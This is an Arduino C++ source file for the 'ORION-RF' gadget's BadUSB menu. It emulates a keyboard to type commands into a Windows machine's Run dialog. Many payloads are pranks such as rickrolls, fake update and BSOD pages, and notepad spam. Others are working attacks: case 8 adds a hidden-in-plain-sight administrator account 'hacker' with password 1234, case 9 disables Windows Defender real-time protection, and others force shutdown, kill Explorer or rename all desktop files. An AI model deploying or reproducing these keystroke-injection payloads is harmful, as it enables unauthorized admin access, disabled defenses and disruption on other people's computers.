#include <Arduino.h>
#include <USBHIDKeyboard.h>
#include "../ui/display.h"

extern USBHIDKeyboard Keyboard;

void runCommand(const char *command) {
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  delay(100);
  Keyboard.releaseAll();
  delay(300);
  Keyboard.print(command);
  Keyboard.write(KEY_RETURN);
}

void showRunningScreen(String taskName, uint8_t duration = 5) {
  u8g2.clearBuffer();
  u8g2.setFont(u8g2_font_6x12_tf);
  u8g2.drawStr(0, 15, "Running:");
  u8g2.drawStr(0, 30, taskName.c_str());
  u8g2.drawFrame(0, 45, 128, 10);

  static const unsigned char image_download_bits[] U8X8_PROGMEM = {
      0x00, 0x00, 0x00, 0x0f, 0x00, 0x00, 0x00, 0x00, 0x80, 0x1f, 0x00, 0x00,
      0x00, 0x80, 0xff, 0x1f, 0x00, 0x00, 0x00, 0x80, 0xff, 0x1f, 0x00, 0x00,
      0x00, 0x60, 0x80, 0x1f, 0x00, 0x00, 0x00, 0x60, 0x00, 0x0f, 0x00, 0x00,
      0x00, 0x18, 0x00, 0x00, 0x00, 0x00, 0x00, 0x18, 0x00, 0x00, 0x00, 0x02,
      0x00, 0x06, 0x00, 0x00, 0x00, 0x0e, 0x00, 0x06, 0x00, 0x00, 0x00, 0x3e,
      0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
      0x00, 0x60, 0x00, 0x00, 0x00, 0x3e, 0x00, 0x60, 0x00, 0x00, 0x00, 0x0e,
      0x00, 0x80, 0x01, 0x00, 0x00, 0x02, 0x00, 0x80, 0x01, 0x00, 0x00, 0x00,
      0x00, 0x00, 0x06, 0xf0, 0x03, 0x00, 0x00, 0x00, 0x06, 0xf0, 0x03, 0x00,
      0x00, 0x00, 0xf8, 0xff, 0x03, 0x00, 0x00, 0x00, 0xf8, 0xff, 0x03, 0x00,
      0x00, 0x00, 0x00, 0xf0, 0x03, 0x00, 0x00, 0x00, 0x00, 0xf0, 0x03, 0x00};
  static const unsigned char image_EviSmile1_bits[] U8X8_PROGMEM = {
      0x0c, 0xc0, 0x00, 0x06, 0x80, 0x01, 0x07, 0x80, 0x03, 0xcf, 0xcf,
      0x03, 0xff, 0xff, 0x03, 0xff, 0xff, 0x03, 0xfe, 0xff, 0x01, 0xfe,
      0xff, 0x01, 0xfe, 0xff, 0x01, 0xf7, 0xbf, 0x03, 0xe7, 0x9f, 0x03,
      0xc7, 0x8f, 0x03, 0x87, 0x87, 0x03, 0x8f, 0xc7, 0x03, 0xff, 0xff,
      0x03, 0xfe, 0xff, 0x01, 0xde, 0xef, 0x01, 0xbc, 0xf4, 0x00, 0x78,
      0x78, 0x00, 0xf0, 0x3f, 0x00, 0xc0, 0x0f, 0x00};

  u8g2.setFontMode(1);
  u8g2.setBitmapMode(1);
  // download
  u8g2.drawXBMP(80, 2, 48, 22, image_download_bits);

  // EviSmile1
  u8g2.drawXBMP(62, 1, 18, 21, image_EviSmile1_bits);

  for (uint8_t i = 0; i <= duration; i++) {
    u8g2.drawBox(1, 46, i * (126.0 / duration), 8);
    u8g2.sendBuffer();
    delay(50);
  }
}


void badUSBMenu(int index) {
 //switch (index)
 //       {
 //           case 0:
 //               runBadUSBDemo();
 //               break;

 //           case 1:
 //               Serial.println("Open CMD payload");
 //               runBadUSBOpenCMD();
 //               break;

 //           case 2:
 //               Serial.println("Rickroll payload");
 //               runBadUSBRickroll();
 //               break;
 //       }


    switch(index) {
    case 0: // demo

        showRunningScreen("DEMO");

        // Run dialog (Win + R)
        Keyboard.press(KEY_LEFT_GUI);
        Keyboard.press('r');
        Keyboard.releaseAll();
        delay(1000);

        Keyboard.println("notepad");
        delay(1500);

        delay(2000);

        Keyboard.println("YOU HAVE BEEN HACKED BY ORION-RF");
        Keyboard.println("#-FEATURES:");
        Keyboard.println("1- WIFI ATTACKS");
        Keyboard.println("2- BLE ATTACKS");
        Keyboard.println("3- BAD USB");
        Keyboard.println("4- NFC");
        Keyboard.println("5- INFRARED");
        Keyboard.println("6- SUB-GHZ");
        Keyboard.println("7- GPIO");
        Keyboard.println("8- APPS");
        Keyboard.println("9- SETTINGS");
        Keyboard.println("10- FILES");

        break;
      case 1: // keyboard
        //runLoop(hidkeyboard);
        break;
      case 2: // saved scripts
        //hidInit();
        //runLoop(hidscriptmenu);

        break;

      case 3: // Open Notepad

        showRunningScreen("notepad");
        runCommand("notepad");
        break;
      case 4: // Open CMD
        showRunningScreen("opening cmd");
        runCommand("cmd");
        break;
      case 5: // Show IP
        showRunningScreen("Getting IP");
        runCommand("cmd");
        delay(500);
        Keyboard.print("ipconfig");
        Keyboard.write(KEY_RETURN);
        break;
      case 6: // Shutdown
        showRunningScreen("shutdown");
        runCommand("shutdown /s /t 0");
        break;
      case 7: // RickRoll
        showRunningScreen("rickroll");
        runCommand("cmd");
        delay(500);
        Keyboard.print("start https://www.youtube.com/watch?v=dQw4w9WgXcQ");
        Keyboard.write(KEY_RETURN);
        break;
      case 8: // Create Admin User
        showRunningScreen("create admin user");
        runCommand("cmd");
        delay(500);
        Keyboard.print("net user hacker 1234 /add");
        Keyboard.write(KEY_RETURN);
        delay(300);
        Keyboard.print("net localgroup administrators hacker /add");
        Keyboard.write(KEY_RETURN);
        break;
      case 9: // Disable Windows Defender
        showRunningScreen("disable windoes defender");
        runCommand("powershell");
        delay(500);
        Keyboard.print("Set-MpPreference -DisableRealtimeMonitoring $true");
        Keyboard.write(KEY_RETURN);
        break;
      case 10: // Open YouTube
        showRunningScreen("youtube");
        runCommand("cmd");
        delay(500);
        Keyboard.print("start https://www.youtube.com");
        Keyboard.write(KEY_RETURN);
        break;
      case 11: // Lock PC
        showRunningScreen("lock pc");
        runCommand("rundll32.exe user32.dll,LockWorkStation");
        break;
      case 12: // Fake Update
        showRunningScreen("fake update");
        runCommand("cmd");
        delay(500);
        Keyboard.print("start https://fakeupdate.net/win10u/");
        Keyboard.write(KEY_RETURN);
        break;

      case 13: // Endless Notepad
        showRunningScreen("endless notepad");
        for (int i = 0; i < 10; i++) {
          runCommand("notepad");
          delay(500);
        }
        break;

      case 14: // Fake BSOD (opens fullscreen image)
        showRunningScreen(" fake bsod");
        runCommand("cmd");
        delay(500);
        Keyboard.print("start https://fakeupdate.net/bsod/");
        Keyboard.write(KEY_RETURN);
        break;

      case 15: // Flip screen
        showRunningScreen("Flip screen");
        Keyboard.press(KEY_LEFT_CTRL);
        Keyboard.press(KEY_LEFT_ALT);
        Keyboard.press(KEY_DOWN_ARROW);
        delay(100);
        Keyboard.releaseAll();
        break;

      case 16: // Matrix effect
        showRunningScreen("Matrix effect");
        runCommand("cmd");
        delay(500);
        Keyboard.print("color 0A");
        Keyboard.write(KEY_RETURN);
        Keyboard.print(":a");
        Keyboard.write(KEY_RETURN);
        Keyboard.print("echo %random%%random%%random%%random%");
        Keyboard.write(KEY_RETURN);
        Keyboard.print("goto a");
        Keyboard.write(KEY_RETURN);
        break;

      case 17: // I'm watching you prank
        showRunningScreen(" iam watching you");
        for (int i = 0; i < 5; i++) {
          runCommand("notepad");
          delay(1000);
          Keyboard.print("I'm watching you...");
          delay(5000);
        }
        break;

      case 18: // Open Google
        showRunningScreen("open google");
        runCommand("cmd");
        delay(500);
        Keyboard.print("start https://www.google.com");
        Keyboard.write(KEY_RETURN);
        break;

      case 19: // Open telegram
        showRunningScreen("open telegram");
        runCommand("cmd");
        delay(500);
        Keyboard.print("start https://web.telegram.org/");
        Keyboard.write(KEY_RETURN);
        break;

      case 20: // Alarm Sound
        showRunningScreen("alarm sound");
        runCommand("cmd");
        delay(500);
        Keyboard.print("start https://www.soundjay.com/button/beep-07.wav");
        Keyboard.write(KEY_RETURN);
        break;

      case 21: // Endless CMD
        showRunningScreen("endless smd");
        for (int i = 0; i < 20; i++) {
          runCommand("cmd");
          delay(300);
        }
        break;

      case 22: // Gibberish
        showRunningScreen("gibberish");
        for (int i = 0; i < 100; i++) {
          char c = random(33, 127);
          Keyboard.write(c);
          delay(50);
        }
        break;

      case 23: // CAPSLOCK Spam
        showRunningScreen("caps lock spam");
        for (int i = 0; i < 10; i++) {
          Keyboard.press(KEY_CAPS_LOCK);
          delay(200);
          Keyboard.release(KEY_CAPS_LOCK);
          delay(200);
        }
        break;

      case 24: // Calculator
        showRunningScreen("claculator");
        runCommand("calc");
        break;

      case 25: // Auto Type "Hacked!"
        showRunningScreen("hacked");
        for (int i = 0; i < 5; i++) {
          Keyboard.print("Hacked!");
          Keyboard.write(KEY_RETURN);
          delay(1000);
        }
        break;

      case 26: // Turn off monitor (Windows only)
        showRunningScreen("turn off monitor");
        runCommand("powershell");
        delay(500);
        Keyboard.print(
            "(Add-Type '[DllImport(\"user32.dll\")]public static extern int "
            "SendMessage(int hWnd, int hMsg, int wParam, int lParam);' -Name a "
            "-Pas)::SendMessage(-1,0x0112,0xF170,2)");
        Keyboard.write(KEY_RETURN);
        break;

      case 27: // RegEdit
        showRunningScreen("regedit");
        runCommand("regedit");
        break;

      case 28: // Kill Explorer
        showRunningScreen(" kill explorer");
        runCommand("taskkill /f /im explorer.exe");
        break;

      case 29: // Flash screen (by changing background rapidly)
        showRunningScreen(" flash screen");
        for (int i = 0; i < 10; i++) {
          runCommand("color 4F");
          delay(200);
          runCommand("color 1F");
          delay(200);
        }
        break;

      case 30: // Rename Desktop Files (basic prank)

        showRunningScreen("rename desktop files");
        runCommand("powershell");
        delay(500);
        Keyboard.print("Get-ChildItem \"$env:USERPROFILE\\Desktop\" | "
                       "Rename-Item -NewName {'hacked'+$_.Name}");
        Keyboard.write(KEY_RETURN);
        break;

      case 31: // Toggle WiFi (requires admin)
        showRunningScreen("toggle wifi");
        runCommand("cmd");
        delay(500);
        Keyboard.print("netsh interface set interface Wi-Fi disabled");
        Keyboard.write(KEY_RETURN);
        delay(1000);
        Keyboard.print("netsh interface set interface Wi-Fi enabled");
        Keyboard.write(KEY_RETURN);
        break;

      case 32: // Screenshot
        showRunningScreen("screenshot");
        runCommand("powershell");
        delay(500);
        Keyboard.print("Add-Type -AssemblyName System.Windows.Forms;");
        Keyboard.write(KEY_RETURN);
        delay(300);
        Keyboard.print("[System.Windows.Forms.SendKeys]::SendWait('%{PRTSC}')");
        Keyboard.write(KEY_RETURN);
        break;

      case 33: // Emoji spam
        showRunningScreen("emoji spam");
        for (int i = 0; i < 10; i++) {
          Keyboard.print("💀");
          Keyboard.write(KEY_RETURN);
          delay(500);
        }
        break;

      case 34: // Control Panel
        showRunningScreen("control panel");
        runCommand("control");
        break;

      case 35: // Troll wallpaper
        showRunningScreen("troll wallpaper");
        runCommand("cmd");
        delay(500);
        Keyboard.print("start https://i.imgur.com/trollface.png");
        Keyboard.write(KEY_RETURN);
        break;

      case 36: // MS Paint
        showRunningScreen("ms paint");
        runCommand("mspaint");
        break;

      case 37: // Auto Tab Switcher
        showRunningScreen(" auto tab switcher");
        for (int i = 0; i < 10; i++) {
          Keyboard.press(KEY_LEFT_CTRL);
          Keyboard.press(KEY_TAB);
          delay(100);
          Keyboard.releaseAll();
          delay(300);
        }
        break;
}
}


